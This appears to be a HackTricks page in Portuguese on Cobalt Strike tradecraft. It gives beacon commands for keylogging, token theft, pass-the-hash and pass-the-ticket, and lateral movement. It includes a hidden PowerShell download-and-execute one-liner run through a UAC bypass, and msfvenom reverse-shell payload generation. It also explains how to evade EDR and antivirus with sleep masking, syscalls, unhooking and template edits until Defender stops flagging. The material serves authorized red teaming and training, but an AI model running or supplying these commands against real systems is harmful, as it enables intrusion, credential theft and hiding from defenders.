# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` então você pode selecionar onde escutar, qual tipo de beacon usar (http, dns, smb...) e muito mais.

### Peer2Peer Listeners

Os beacons desses listeners não precisam se comunicar diretamente com o C2; eles podem se comunicar com ele por meio de outros beacons.

`Cobalt Strike -> Listeners -> Add/Edit` então você precisa selecionar os beacons TCP ou SMB

* O **TCP beacon definirá um listener na porta selecionada**. Para se conectar a um TCP beacon, use o comando `connect <ip> <port>` a partir de outro beacon
* O **smb beacon escutará em um pipename com o nome selecionado**. Para se conectar a um SMB beacon, use o comando `link [target] [pipe]`.

### Gerar e hospedar payloads

#### Gerar payloads em arquivos

`Attacks -> Packages ->`

* **`HTMLApplication`** para arquivos HTA
* **`MS Office Macro`** para um documento do Office com uma macro
* **`Windows Executable`** para um .exe, .dll ou service .exe
* **`Windows Executable (S)`** para um .exe, .dll ou service .exe **stageless** (stageless é melhor que staged, pois gera menos IoCs)

#### Gerar e hospedar payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Isso gerará um script/executável para baixar o beacon do Cobalt Strike em formatos como: bitsadmin, exe, powershell e python

#### Hospedar payloads

Se você já tiver o arquivo que deseja hospedar em um servidor web, basta acessar `Attacks -> Web Drive-by -> Host File` e selecionar o arquivo para hospedar e a configuração do servidor web.

### Opções do Beacon

<details>
<summary>Opções e comandos do beacon</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket on the attacker machine from a PowerShell session and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump an interesting ticket by LUID
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On the Metasploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Custom implants / Linux Beacons

- Um custom agent só precisa falar o protocolo HTTP/S do Cobalt Strike Team Server (perfil C2 malleable padrão) para se registrar/fazer check-in e receber tarefas. Implemente as mesmas URIs/headers/criptografia de metadata definidos no perfil para reutilizar a UI do Cobalt Strike para tasking e saída.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Um Aggressor Script (por exemplo, `CustomBeacon.cna`) pode encapsular a geração de payloads para o beacon não-Windows, permitindo que os operadores selecionem o listener e produzam payloads ELF diretamente pela GUI.
- Exemplos de task handlers Linux expostos ao Team Server: `sleep`, `cd`, `pwd`, `shell` (executa comandos arbitrários), `ls`, `upload`, `download` e `exit`. Eles correspondem aos task IDs esperados pelo Team Server e devem ser implementados no lado do servidor para retornar a saída no formato adequado.
- O suporte a BOF no Linux pode ser adicionado carregando Beacon Object Files em processo com o [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (também suporta BOFs no estilo Outflank), permitindo que o post-exploitation modular seja executado dentro do contexto/privilégios do implant sem criar novos processos.<sup>[[2]](#references)[[3]](#references)</sup>
- Incorpore um handler SOCKS no custom beacon para manter a paridade de pivoting com os Windows Beacons: quando o operador executar `socks <port>`, o implant deverá abrir um proxy local para rotear as ferramentas do operador através do host Linux comprometido para redes internas.

## Opsec

### Execute-Assembly

O **`execute-assembly`** usa um **processo sacrificial** com injection de processo remoto para executar o programa indicado. Isso é muito ruidoso, pois, para fazer injection dentro de um processo, são usadas determinadas Win APIs que todo EDR verifica. No entanto, existem algumas ferramentas customizadas que podem ser usadas para carregar algo no mesmo processo:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- No Cobalt Strike, você também pode usar BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

O agressor script `https://github.com/outflanknl/HelpColor` criará o comando `helpx` no Cobalt Strike, que adicionará cores aos comandos, indicando se eles são BOFs (verde), se são Frok&Run (amarelo) e similares, ou se são ProcessExecution, injection ou similares (vermelho). Isso ajuda a identificar quais comandos são mais stealthy.

### Modern in-process post-execution

Versões recentes adicionam duas alternativas quando um BOF COFF clássico é muito limitado:

- **Beacon Interpreter** compila C no Team Server para bytecode intermediário e o executa em uma VM incorporada ao Beacon. O bytecode permanece como dados, em vez de código executável nativo, evitando a alocação executável adicional e a transição de permissões de RW para RX normalmente necessárias para carregar um BOF. Os scripts podem importar a Beacon API e declarar protótipos de Dynamic Function Resolution (DFR) no estilo BOF.
- **BOF-PE** carrega um EXE ou DLL completo no Beacon atual. Esse formato oferece suporte a imports PE normais, tratamento de exceções, C++ mais completo e bibliotecas externas, mantendo a Beacon API. Ele é mais pesado que um BOF COFF pequeno; portanto, use-o somente quando o runtime adicional for útil.
```bash
# Compile a C script on the Team Server and execute its bytecode
beacon-interpreter /path/to/script.c

# Execute a BOF-PE in the current Beacon
inline-execute-pe /path/to/tool.x64.exe
```
Esses mecanismos reduzem os sinais relacionados ao loader, mas não a telemetria produzida pelas ações do script ou pelas chamadas da Windows API.<sup>[[8]](#references)</sup>

### Agir como o usuário

Você poderia verificar eventos como `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Security EID 4624 - Verifique todos os logons interativos para descobrir o horário normal de funcionamento.
- System EID 12,13 - Verifique a frequência de desligamentos/inicializações/suspensões.
- Security EID 4624/4625 - Verifique as tentativas NTLM de entrada válidas e inválidas.
- Security EID 4648 - Esse evento é criado quando credenciais em texto simples são usadas para fazer logon. Se um processo o gerou, o binário potencialmente contém as credenciais em texto claro em um arquivo de configuração ou dentro do código.

Ao usar `jump` no Cobalt Strike, é melhor usar o método `wmi_msbuild` para fazer o novo processo parecer mais legítimo.

### Usar computer accounts

É comum que os defensores verifiquem comportamentos estranhos gerados por usuários e **excluam service accounts e computer accounts como `*$` do monitoramento**. Você poderia usar essas contas para realizar lateral movement ou privilege escalation.

### Usar stageless payloads

Stageless payloads são menos ruidosos que os staged porque não precisam baixar um segundo estágio do servidor C2. Isso significa que não geram tráfego de rede após a conexão inicial, tornando-os menos propensos a serem detectados por defesas baseadas em rede.

### Tokens & Token Store

Tenha cuidado ao roubar ou gerar tokens, pois um EDR pode enumerar tokens de threads e detectar um **token pertencente a um usuário diferente** ou até mesmo ao SYSTEM dentro do processo.

Isso permite armazenar tokens **por beacon**, para que não seja necessário roubar o mesmo token repetidamente. Isso é útil para lateral movement ou quando você precisa usar um token roubado várias vezes:

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- token-store show
- `token-store use <id>`
- `token-store remove <id>`
- token-store remove-all

Ao realizar lateral movement, geralmente é melhor **roubar um token em vez de gerar um novo** ou executar um ataque pass the hash.

### Guardrails

O Cobalt Strike possui um recurso chamado **Guardrails**, que ajuda a impedir o uso de determinados comandos ou ações que poderiam ser detectados pelos defensores. Os Guardrails podem ser configurados para bloquear comandos específicos, como `make_token`, `jump`, `remote-exec` e outros normalmente usados para lateral movement ou privilege escalation.

Além disso, o repositório [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) também contém algumas verificações e ideias que você poderia considerar antes de executar um payload.

### Criptografia de tickets

Em um AD, tenha cuidado com a criptografia dos tickets. Por padrão, algumas ferramentas usam criptografia RC4 para tickets Kerberos, que é menos segura que a criptografia AES, e ambientes atualizados normalmente usam AES por padrão. Isso pode ser detectado por defensores que monitoram algoritmos de criptografia fracos.

### Evitar padrões

Ao usar o Cobalt Strike, por padrão, os named pipes SMB terão os nomes `msagent_####` e `"status_####"`. Altere esses nomes. É possível verificar os nomes dos pipes existentes no Cobalt Strike com o comando: `ls \\.\pipe\`

Além disso, com sessões SSH, é criado um pipe chamado `\\.\pipe\postex_ssh_####`. Altere-o com `set ssh_pipename "<new_name>";`.

Também em ataques de post-exploitation, os pipes `\\.\pipe\postex_####` podem ser modificados com `set pipename "<new_name>"`.

Nos perfis do Cobalt Strike, você também pode modificar itens como:

- Evitar o uso de `rwx`
- Como funciona o comportamento de process injection (quais APIs serão usadas) no bloco `process-inject {...}`
- Como funciona o "fork and run" no bloco `post-ex {…}`
- O tempo de sleep
- O tamanho máximo dos binários a serem carregados na memória
- O memory footprint e o conteúdo das DLLs com o bloco `stage {...}`
- O tráfego de rede

### Sleepmask e BeaconGate

Um Sleepmask transforma o Beacon e suas alocações de heap rastreadas enquanto ele está inativo e depois os restaura para a execução de tarefas. As versões atuais oferecem um padrão evasivo, mas BOFs de Sleepmask personalizados continuam sendo úteis quando os requisitos de layout de memória, alocação ou call stack são diferentes. A partir da versão 4.13, o Sleepmask padrão também falsifica o endereço de retorno das APIs encaminhadas por meio do BeaconGate.<sup>[[8]](#references)</sup>

**BeaconGate** amplia esse design para além de `Sleep`: chamadas selecionadas da WinAPI são representadas como estruturas `FUNCTION_CALL` e encaminhadas ao BOF do Sleepmask, que pode mascarar o Beacon durante a execução da chamada. O perfil pode controlar um grupo (`Comms`, `Core`, `Cleanup` ou `All`) ou apenas APIs individuais:<sup>[[9]](#references)</sup>
```text
stage {
set sleep_mask "true";
set syscall_method "Indirect";

beacon_gate {
VirtualAlloc;       # Routed through BeaconGate
VirtualAllocEx;
InternetConnectA;
}
}
```
Para uma API listada em `beacon_gate`, o gate tem precedência sobre `syscall_method`; APIs não listadas ainda podem usar o método de syscall configurado. `beacon_gate disable` e `beacon_gate enable` alternam o recurso em runtime. Evite habilitar `All` cegamente: comandos como `ps` chamam repetidamente `OpenProcess`/`CloseHandle` e podem causar um pico de CPU quando cada chamada mascara e desmascara o Beacon. Sleepmask-VS fornece estados simulados de Beacon/Sleepmask para depurar gates personalizados sem testá-los repetidamente por meio de um implant ativo.<sup>[[9]](#references)</sup>

### Noisy proc injections

Ao injetar código em um processo, isso geralmente gera muito ruído, porque **nenhum processo comum costuma executar essa ação e as formas de fazê-lo são muito limitadas**. Portanto, isso pode ser detectado por sistemas de detecção baseados em comportamento. Além disso, também pode ser detectado por EDRs que examinam a rede em busca de **threads contendo código que não está no disco** (embora processos como navegadores, que usam JIT, façam isso com frequência). Exemplo: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | relações de PID e PPID

Ao iniciar um novo processo, é importante **manter uma relação normal de pai e filho** entre os processos para evitar a detecção. Se svchost.exe estiver executando iexplorer.exe, isso parecerá suspeito, pois svchost.exe não é pai de iexplorer.exe em um ambiente Windows normal.

Quando um novo beacon é iniciado no Cobalt Strike, por padrão, um processo que usa **`rundll32.exe`** é criado para executar o novo listener. Isso não é muito furtivo e pode ser facilmente detectado por EDRs. Além disso, `rundll32.exe` é executado sem nenhum argumento, o que o torna ainda mais suspeito.

Com o seguinte comando do Cobalt Strike, você pode especificar um processo diferente para iniciar o novo beacon, tornando-o menos detectável:
```bash
spawnto x86 svchost.exe
```
Você também pode alterar esta configuração **`spawnto_x86` e `spawnto_x64`** em um profile.

### Proxying o tráfego do atacante

Às vezes, os atacantes precisarão executar ferramentas localmente, até mesmo em máquinas Linux, e fazer com que o tráfego das vítimas chegue à ferramenta (por exemplo, NTLM relay).

Além disso, às vezes, para realizar um ataque pass-the.hash ou pass-the-ticket, é mais furtivo para o atacante **adicionar esse hash ou ticket ao próprio processo LSASS** localmente e então fazer pivot a partir dele, em vez de modificar um processo LSASS de uma máquina vítima.

No entanto, você precisa ter **cuidado com o tráfego gerado**, pois pode estar enviando tráfego incomum (Kerberos?) do seu processo backdoor. Para isso, você poderia fazer pivot para um processo de navegador (embora possa ser detectado injetando-se em um processo, portanto, pense em uma maneira furtiva de fazer isso).


### Evitando AVs

#### Bypass de AV/AMSI/ETW

Consulte a página:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Geralmente, em `/opt/cobaltstrike/artifact-kit`, você pode encontrar o código e os templates pré-compilados (em `/src-common`) dos payloads que o Cobalt Strike usará para gerar os beacons binários.

Usando [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) com o backdoor gerado (ou apenas com o template compilado), você pode descobrir o que está fazendo o Defender disparar. Geralmente, é uma string. Portanto, você pode simplesmente modificar o código que está gerando o backdoor para que essa string não apareça no binário final.

Depois de modificar o código, basta executar `./build.sh` no mesmo diretório e copiar a pasta `dist-pipe/` para o cliente Windows em `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Não se esqueça de carregar o script agressivo `dist-pipe\artifact.cna` para indicar ao Cobalt Strike que use os recursos do disco que queremos, e não os que foram carregados.

#### Resource Kit

A pasta ResourceKit contém os templates para os payloads baseados em script do Cobalt Strike, incluindo PowerShell, VBA e HTA.

Usando o [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) com os templates, você pode descobrir o que o Defender (AMSI, neste caso) não está aceitando e modificá-lo:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Modificando as linhas detectadas, é possível gerar um template que não será detectado.

Não se esqueça de carregar o script agressivo `ResourceKit\resources.cna` para indicar ao Cobalt Strike que use os resources do disco que queremos, e não os que foram carregados.

#### Function hooks | Syscall

Function hooking é um método muito comum usado por EDRs para detectar atividades maliciosas. O Cobalt Strike permite ignorar esses hooks usando **syscalls** em vez das chamadas padrão da API do Windows com a configuração **`None`**, usar a versão **`Nt*`** de uma função com a configuração **`Direct`** ou simplesmente pular a função **`Nt*`** com a opção **`Indirect`** no malleable profile. Dependendo do sistema, uma opção pode ser mais stealth que outra.

Isso pode ser configurado no profile ou usando o comando **`syscall-method`**.

No entanto, isso também pode gerar ruído.

Outra opção oferecida pelo Cobalt Strike para ignorar function hooks é removê-los com: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Você também pode verificar quais funções estão hookadas com [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) ou [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Comandos diversos do Cobalt Strike</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>



## References

- [1] [Cobalt Strike Linux Beacon (PoC de implant customizado)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Modelo de nix BOF da Outflank](https://github.com/outflanknl/nix_bof_template)
- [4] [Análise da criptografia de metadata do Cobalt Strike pela Unit42](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [Diário da SANS ISC sobre o tráfego do Cobalt Strike](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [CobaltStrikeParser da SentinelOne](https://github.com/Sentinel-One/CobaltStrikeParser)
- [8] [Cobalt Strike 4.13: Perdido na tradução](https://www.cobaltstrike.com/blog/cobalt-strike-413-lost-in-translation)
- [9] [Cobalt Strike 4.10: Através do BeaconGate](https://www.cobaltstrike.com/blog/cobalt-strike-410-through-the-beacongate?p=6046)
{{#include ../banners/hacktricks-training.md}}
